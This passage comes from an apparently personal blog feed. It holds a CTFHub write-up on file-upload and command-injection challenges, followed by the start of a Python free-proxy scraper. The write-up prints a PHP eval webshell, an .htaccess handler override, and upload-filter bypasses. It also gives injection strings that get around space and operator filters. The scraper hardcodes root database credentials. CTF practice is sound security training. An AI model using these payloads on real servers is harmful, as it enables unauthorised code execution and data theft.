class="line-numbers-rows"><span></span></span></code></pre><p>这里看到只允许上传三种图片，尝试通过修改文件名后缀来进行绕过</p><img src="https://s1.ax1x.com/2020/04/08/GfaKot.png"><p>这里上传了一个<code>1.php.jpg</code>发现可以上传成功，使用Burpsuite来对上传的这个文件进行修改</p><img src="https://s1.ax1x.com/2020/04/08/Gfa1W8.png"><p>这里显示上传成功了，这里用蚁剑连接，得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>e3f815403d9372e9ed80556faf1205b39af449be<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、-htaccess"><a href="#3、-htaccess" class="headerlink" title="3、.htaccess"></a>3、<code>.htaccess</code></h3><p>​        <code>htaccess</code> 文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><img src="https://s1.ax1x.com/2020/04/08/Gfa8SS.png"><p>先来写一个<code>.htaccess</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">'1'</span><span class="token operator">></span>SetHandler application/x-httpd-php<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后上传上去</p><img src="https://s1.ax1x.com/2020/04/08/GfaGQg.png"><p>再将一句话木马上传上去</p><img src="https://s1.ax1x.com/2020/04/08/GfaNes.png"><p>然后查看</p><img src="https://s1.ax1x.com/2020/04/08/Gfaaoq.png"><p>后缀为 <code>.jpg</code> 的文件已经被当作 <code>php</code> 执行了，在上级目录找到flag</p><h3 id="4、文件头检查"><a href="#4、文件头检查" class="headerlink" title="4、文件头检查"></a>4、文件头检查</h3><p>先修改一下一句话木马</p><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?php</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'vale'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s1.ax1x.com/2020/04/08/Gfa0YV.png"><p>发现可以上传成功，然后通过Burpsuite修改截取到的报文，改为php</p><img src="https://s1.ax1x.com/2020/04/08/GfaBWT.png"><p>上蚁剑</p><p>可以获取到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>7e23bd109e2388c287799eb8abe02c84849ddee2<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5、MIME绕过"><a href="#5、MIME绕过" class="headerlink" title="5、MIME绕过"></a>5、MIME绕过</h3><p>​        通常题目都有多种解法，这里给出两种解法</p><h4 id="5-1、修改文件名后缀"><a href="#5-1、修改文件名后缀" class="headerlink" title="5.1、修改文件名后缀"></a>5.1、修改文件名后缀</h4><img src="https://s1.ax1x.com/2020/04/08/GfaslF.png"><p>然后用蚁剑就可以连接上1.php</p><img src="https://s1.ax1x.com/2020/04/08/Gfayy4.png"><p>于是获取到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>7a1ea639715f683cf8d28d321d47d6045ff3fb98<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-2、修改MIME属性"><a href="#5-2、修改MIME属性" class="headerlink" title="5.2、修改MIME属性"></a>5.2、修改MIME属性</h4><img src="https://s1.ax1x.com/2020/04/08/Gfa6OJ.png"><p>同样能获取flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>7a1ea639715f683cf8d28d321d47d6045ff3fb98<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、00截断"><a href="#6、00截断" class="headerlink" title="6、00截断"></a>6、00截断</h3><p>​        了解一下 PHP 5.2 00截断上传的原理</p><img src="https://s1.ax1x.com/2020/04/08/Gfagm9.png"><p>然后得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>07deef9128fa647f12cd720c83ebc39b666de009<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7、双写后缀"><a href="#7、双写后缀" class="headerlink" title="7、双写后缀"></a>7、双写后缀</h3><p>​        题目中的黑名单源码</p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--$name = basename($_FILES['file']['name']);$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");$name = str_ireplace($blacklist, "", $name);--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上传了一个2.phpp后得到响应</p><pre class="line-numbers language-bash"><code class="language-bash">上传文件相对路径upload/2.p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以构建2.phppphphphpp，上传文件成功</p><img src="https://s1.ax1x.com/2020/04/08/Gfa2wR.png"><p>使用蚁剑连接得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>c85d034eaceabfe7adc8bacd788171ababc9d981<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、RCE"><a href="#三、RCE" class="headerlink" title="三、RCE"></a>三、RCE</h2><h3 id="1、命令注入"><a href="#1、命令注入" class="headerlink" title="1、命令注入"></a>1、命令注入</h3><h4 id="1-1、无过滤"><a href="#1-1、无过滤" class="headerlink" title="1.1、无过滤"></a>1.1、无过滤</h4><p>​        这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p><img src="https://s1.ax1x.com/2020/04/08/GfafFx.png"><p>然后查看当前目录下的另外一个文件</p><img src="https://s1.ax1x.com/2020/04/08/GfahY6.png"><p>执行成功了，但是没显示，查看源码</p><img src="https://s1.ax1x.com/2020/04/08/Gfa4fK.png"><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>6d3ee68b38435ebaf9a6b2c8727df1ad4ecb0efb<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-2、过滤cat"><a href="#1-2、过滤cat" class="headerlink" title="1.2、过滤cat"></a>1.2、过滤cat</h4><p>只是过滤了cat命令，可以使用的还有很多，比如less、more等</p><img src="https://s1.ax1x.com/2020/04/08/GfaISO.png"><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>c9b549c888333093c59b5bb891f23b71eaf9c0f5<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-3、这次过滤了空格，你能绕过吗"><a href="#1-3、这次过滤了空格，你能绕过吗" class="headerlink" title="1.3、这次过滤了空格，你能绕过吗"></a>1.3、这次过滤了空格，你能绕过吗</h4><p>还是先查看</p><img src="https://s1.ax1x.com/2020/04/08/GfaolD.png"><p>得到了提示</p><pre class="line-numbers language-bash"><code class="language-bash">flag_94782730921038.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构建语句</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1<span class="token operator">||</span><span class="token function">cat</span><span class="token variable">${IFS}</span>flag_94782730921038.php127.0.0.1<span class="token operator">||</span><span class="token function">cat</span><span class="token variable">$IFS</span><span class="token variable">$9flag_94782730921038</span>.php127.0.0.1<span class="token operator">||</span>cat<span class="token operator">&lt;</span>flag_94782730921038.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>5440818da520b70a4c68059817197a7a5b5ae17e<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4、过滤目录分隔符"><a href="#1-4、过滤目录分隔符" class="headerlink" title="1.4、过滤目录分隔符"></a>1.4、过滤目录分隔符</h4><p>​        这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#经过探测在flag_is_here下有一个flag_10920239332661.php文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造最简单的语句</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1<span class="token punctuation">;</span><span class="token function">cd</span> flag_is_here <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> flag_10920239332661.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到了flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>2bf4ea917a359d1456bcd5ba49d8bfbc35134da6<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-5、过滤运算符"><a href="#1-5、过滤运算符" class="headerlink" title="1.5、过滤运算符"></a>1.5、过滤运算符</h4><p>​        过滤了几个运算符, 要怎么绕过呢</p><img src="https://s1.ax1x.com/2020/04/08/Gfa7OH.png"><p>可以看到仅仅是过滤了几个运算符</p><pre class="line-numbers language-bash"><code class="language-bash">\、<span class="token operator">||</span>、<span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造语句</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1<span class="token punctuation">;</span><span class="token function">cat</span> flag_278722724924118.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到了flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>6d341efb911fc84bb36c82ee6f7621ed9fcda26e<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-6、综合过滤"><a href="#1-6、综合过滤" class="headerlink" title="1.6、综合过滤"></a>1.6、综合过滤</h4><p>​        同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><img src="https://s1.ax1x.com/2020/04/08/Gfabmd.png"><p>这下就全过滤了，这里需要用到下面两个</p><pre class="line-numbers language-bash"><code class="language-bash">%0a换行%0d回车<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造</p><pre class="line-numbers language-bash"><code class="language-bash">http://challenge-c1f8d7959916b687.sandbox.ctfhub.com:10080/?ip<span class="token operator">=</span>127.0.0.1%0acd<span class="token variable">${IFS}</span>fl<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>g_is_here%0ac%27%27at<span class="token variable">${IFS}</span><span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>lag*<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>38ba8c2fa7e770b428eaf774e97f5d8ddba2f8e8<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理"><a href="#Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理" class="headerlink" title="Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理"></a>Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理</h2><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续~~"></a>未完待续~~</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python、CTF、WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maintain-Agent-Pool</title>
      <link href="/2020/04/07/maintainin-agent-pool/"/>
      <url>/2020/04/07/maintainin-agent-pool/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3维护免费代理池"><a href="#Python3维护免费代理池" class="headerlink" title="Python3维护免费代理池"></a>Python3维护免费代理池</h1><h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>​        最近在学习Python爬虫，于是想要在网上找一些免费的代理练练手，于是有了这个项目。</p><h2 id="二、项目结构"><a href="#二、项目结构" class="headerlink" title="二、项目结构"></a>二、项目结构</h2><h3 id="1、爬取下面两个个站点"><a href="#1、爬取下面两个个站点" class="headerlink" title="1、爬取下面两个个站点"></a>1、爬取下面两个个站点</h3><ul><li>“<a href="https://www.kuaidaili.com/free/inha/&quot;" target="_blank" rel="noopener">https://www.kuaidaili.com/free/inha/"</a></li><li>“<a href="https://www.xicidaili.com/nn/&quot;" target="_blank" rel="noopener">https://www.xicidaili.com/nn/"</a></li></ul><h3 id="2、使用百度对爬取到的代理进行检测"><a href="#2、使用百度对爬取到的代理进行检测" class="headerlink" title="2、使用百度对爬取到的代理进行检测"></a>2、使用百度对爬取到的代理进行检测</h3><ul><li><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></li></ul><h3 id="3、保存爬取到的代理信息"><a href="#3、保存爬取到的代理信息" class="headerlink" title="3、保存爬取到的代理信息"></a>3、保存爬取到的代理信息</h3><h4 id="3-1、将没有验证的直接放到数据库的-uncheck-proxies-表中"><a href="#3-1、将没有验证的直接放到数据库的-uncheck-proxies-表中" class="headerlink" title="3.1、将没有验证的直接放到数据库的 uncheck_proxies 表中"></a>3.1、将没有验证的直接放到数据库的 <code>uncheck_proxies</code> 表中</h4><h4 id="3-2、将验证过的直接放到数据库的-available-proxies-表中"><a href="#3-2、将验证过的直接放到数据库的-available-proxies-表中" class="headerlink" title="3.2、将验证过的直接放到数据库的 available_proxies 表中"></a>3.2、将验证过的直接放到数据库的 <code>available_proxies</code> 表中</h4><h2 id="三、项目代码"><a href="#三、项目代码" class="headerlink" title="三、项目代码"></a>三、项目代码</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/13 16:08</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> threading<span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib3<span class="token keyword">import</span> random<span class="token keyword">import</span> reurllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MaintainProxyPool</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>kuai_proxy <span class="token operator">=</span> <span class="token string">"https://www.kuaidaili.com/free/inha/"</span>        self<span class="token punctuation">.</span>xici_proxy <span class="token operator">=</span> <span class="token string">"https://www.xicidaili.com/nn/"</span>        self<span class="token punctuation">.</span>check_proxy <span class="token operator">=</span> <span class="token string">'https://www.baidu.com'</span>        self<span class="token punctuation">.</span>kuai_infos<span class="token punctuation">,</span> self<span class="token punctuation">.</span>xici_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>alive_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>merge_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    @staticmethod    <span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>        <span class="token punctuation">]</span>        header <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span>        <span class="token keyword">return</span> header    @staticmethod    <span class="token keyword">def</span> <span class="token function">get_html</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> MaintainProxyPool<span class="token punctuation">.</span>get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>            html <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> html    <span class="token keyword">def</span> <span class="token function">get_status_code</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> proxy<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> MaintainProxyPool<span class="token punctuation">.</span>get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_proxy<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span>        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> res<span class="token punctuation">.</span>status_code    <span class="token keyword">def</span> <span class="token function">get_kuai_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 开始爬取kuai代理的代理"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>kuai_proxy <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span>            html <span class="token operator">=</span> self<span class="token punctuation">.</span>get_html<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                infos <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;td data.*?>(.*)&lt;/td>"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>html<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                infos<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                infos<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                infos<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>kuai_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>infos<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>kuai_infos    <span class="token keyword">def</span> <span class="token function">get_xici_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 开始爬取xici的代理"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>xici_proxy <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            html <span class="token operator">=</span> self<span class="token punctuation">.</span>get_html<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                infos <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;td>(.*)&lt;/td>"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>html<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                infos<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>xici_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>infos<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>xici_infos    <span class="token keyword">def</span> <span class="token function">check_alive</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>merge_infos <span class="token operator">=</span> self<span class="token punctuation">.</span>get_kuai_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>get_xici_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 开始检测爬取到代理的可用性..."</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> info <span class="token keyword">in</span> self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">:</span>            <span class="token keyword">if</span> info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"HTTP"</span> <span class="token operator">or</span> <span class="token string">"http"</span><span class="token punctuation">:</span>                proxy_http <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://"</span> <span class="token operator">+</span> info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>get_status_code<span class="token punctuation">(</span>proxy_http<span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>alive_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>info<span class="token punctuation">)</span>            <span class="token keyword">elif</span> info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                proxy_https <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"https"</span><span class="token punctuation">:</span> <span class="token string">"https://"</span> <span class="token operator">+</span> info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>get_status_code<span class="token punctuation">(</span>proxy_https<span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>alive_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">,</span> self<span class="token punctuation">.</span>alive_infos<span class="token keyword">class</span> <span class="token class-name">CreateTables</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""此类用于生成表结构"""</span>    engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+mysqlconnector://root:root@localhost:3306/proxies'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> echo<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> max_overflow<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">class</span> <span class="token class-name">UncheckProxies</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>        __tablename__ <span class="token operator">=</span> <span class="token string">'uncheck_proxies'</span>        id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        ip_address <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        link_port <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        conn_type <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        verify_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">class</span> <span class="token class-name">UsableProxy</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>        __tablename__ <span class="token operator">=</span> <span class="token string">'available_proxies'</span>        id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        ip_address <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    